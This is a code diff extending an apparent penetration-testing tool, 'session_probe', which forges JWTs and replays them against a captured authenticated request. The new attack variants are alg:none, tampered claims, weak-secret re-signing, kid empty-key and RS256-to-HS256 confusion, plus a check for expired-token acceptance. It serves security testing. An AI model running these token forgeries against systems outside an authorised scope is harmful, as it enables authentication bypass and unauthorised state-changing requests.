@@ -15,7 +15,7 @@ import { Request } from "../../session/request"
 import { HttpMessage } from "../../replay/message"
 import { Mutate } from "../../replay/mutate"
 import { originOf, inScope, stripAuthHeaders, sendGoverned } from "../http-replay"
-import { findJwts, analyzeJwtStatic, forgeNone, forgeTamperedClaim, forgeResigned, findWeakSecret, type FoundJwt } from "./jwt"
+import { findJwts, analyzeJwtStatic, forgeNone, forgeTamperedClaim, forgeResigned, forgeAlgConfusion, forgeKidEmptyKey, findWeakSecret, type FoundJwt } from "./jwt"
 import { parseCookieHeader, isSessionCookie, classifyCookieEntropy } from "./cookie"
 import { runJwtAcceptance, type SessResp } from "./probe"
 
@@ -53,9 +53,13 @@ async function sendDecoded(msg: HttpMessage.Request, origin: string, abort: Abor
 
 export const SessionProbeTool = Tool.define("session_probe", {
   description:
-    "Deterministic session-management probe (WSTG-SESS). On a captured, authenticated request it: (1) finds the JWT in the Cookie/Authorization header and tests it for alg:none acceptance, signature-not-validated (tampered claim), and a weak-HMAC-secret dictionary attack; (2) scores the session cookie's entropy/structure. JWT acceptance is proven by replaying forged tokens against a no-token control (only claims 'accepted' when the same request WITHOUT a session is denied). A weak-secret hit is a standalone break (arbitrary token forgery). Pass a request that carries the session (post-login). Safe methods are replayed freely; a write is tested too (flagged) unless safe_only=true.",
+    "Deterministic session-management probe (WSTG-SESS). On a captured, authenticated request it: (1) finds the JWT in the Cookie/Authorization header and tests it for alg:none, signature-not-validated (tampered claim), weak-HMAC-secret dictionary, kid path-traversal-to-empty-key, expired-token acceptance, and — with a supplied public_key — RS256→HS256 alg confusion; it also flags jku/x5u/jwk key-resolution surface (SSRF/OOB); (2) scores the session cookie's entropy/structure. JWT acceptance is proven by replaying forged tokens against a no-token control (only claims 'accepted' when the same request WITHOUT a session is denied). A weak-secret hit is a standalone break (arbitrary token forgery). Pass a request that carries the session (post-login). Safe methods are replayed freely; a write is tested too (flagged) unless safe_only=true.",
   parameters: z.object({
     request_id: z.string().describe("A captured, authenticated request that carries the session token (cookie or Authorization header)."),
+    public_key: z
+      .string()
+      .optional()
+      .describe("PEM public key for the token's RSA/EC signature, if you discovered one (e.g. /.well-known/jwks.json, a cert). Enables the RS256→HS256 alg-confusion test (re-sign HS256 with the public key as the HMAC secret)."),
     safe_only: z
       .boolean()
       .optional()
@@ -97,6 +101,8 @@ export const SessionProbeTool = Tool.define("session_probe", {
       if (s.alg_none_issued) staticFindings.push({ kind: "jwt-alg-none-issued", location: f.location, note: `the server ISSUED an unsigned (alg:none) token at ${f.location} — no integrity at all` })
       if (s.weak_secret) staticFindings.push({ kind: "jwt-weak-secret", location: f.location, severity: "critical", note: `the HS* signing secret is the weak/known value "${s.weak_secret}" — an attacker can forge ANY token (full auth bypass). Deterministic: the secret verifies the captured token's signature.` })
       if (s.expired) staticFindings.push({ kind: "jwt-expired-token-in-use", location: f.location, note: `the presented token is past its exp (${s.exp}) — if the server still honors it (see acceptance), expiry is not enforced` })
+      if (s.header_surface.length) staticFindings.push({ kind: "jwt-key-resolution-surface", location: f.location, params: s.header_surface, note: `token header carries attacker-influenceable key-resolution params (${s.header_surface.join(", ")}): kid → path/SQL injection into key lookup (kid-empty-key is tested below); jku/x5u → fetch a key from a URL (SSRF + key substitution, OOB — use a collaborator); jwk/x5c → embedded self-signed key. Test each.` })
+      if (s.rsa && !params.public_key) staticFindings.push({ kind: "jwt-alg-confusion-candidate", location: f.location, note: `asymmetric alg (${s.alg}) — RS→HS alg confusion is possible if the server verifies with its public key regardless of alg. Re-run with public_key=<PEM> (from jwks.json / a cert) to test it deterministically.` })
     }
 
     const cookieHdr = headerValue(baseMsg, "cookie")
@@ -122,13 +128,21 @@ export const SessionProbeTool = Tool.define("session_probe", {
         const variants: { name: string; msg: HttpMessage.Request }[] = [
           { name: "alg:none", msg: replaceToken(baseMsg, target.location, forgeNone(target.jwt)) },
           { name: "tampered-claim", msg: replaceToken(baseMsg, target.location, forgeTamperedClaim(target.jwt, { _cs_probe: 1 })) },
+          { name: "kid-empty-key", msg: replaceToken(baseMsg, target.location, forgeKidEmptyKey(target.jwt, undefined, { _cs_probe: 1 })) },
         ]
         if (weak) variants.push({ name: "weak-secret-resign", msg: replaceToken(baseMsg, target.location, forgeResigned(target.jwt, weak, { _cs_probe: 1 })) })
+        if (params.public_key) variants.push({ name: "alg-confusion(RS→HS)", msg: replaceToken(baseMsg, target.location, forgeAlgConfusion(target.jwt, params.public_key, { _cs_probe: 1 })) })
 
         const run = await runJwtAcceptance(
           { ownerMsg: baseMsg, controlMsg: stripAuthHeaders(baseMsg), variants },
           (msg) => sendDecoded(msg, origin, ctx.abort),
         )
+        // Expired-token acceptance: the owner baseline replays the ORIGINAL captured token now. If it is
+        // past its exp yet still returns 2xx, expiry is not enforced (WSTG-SESS-07). Deterministic from
+        // the baseline — no forging needed.
+        const stat = analyzeJwtStatic(target.jwt)
+        if (stat.expired && run.owner.status != null && run.owner.status >= 200 && run.owner.status < 300)
+          run.results.push({ variant: "expired-token(original)", verdict: "broken", forged_status: run.owner.status, similarity: 1, note: `the presented token is past its exp (${stat.exp}) yet the server returned ${run.owner.status} — token expiry is NOT enforced.` })
         acceptance = { target: target.location, owner_status: run.owner.status, control_status: run.control.status, results: run.results }
         if (stateChanging) acceptanceWarning = `STATE-CHANGING (${request.method}): forged tokens were replayed against this endpoint, so a write may have run under a forged session — verify side effects.`
       }
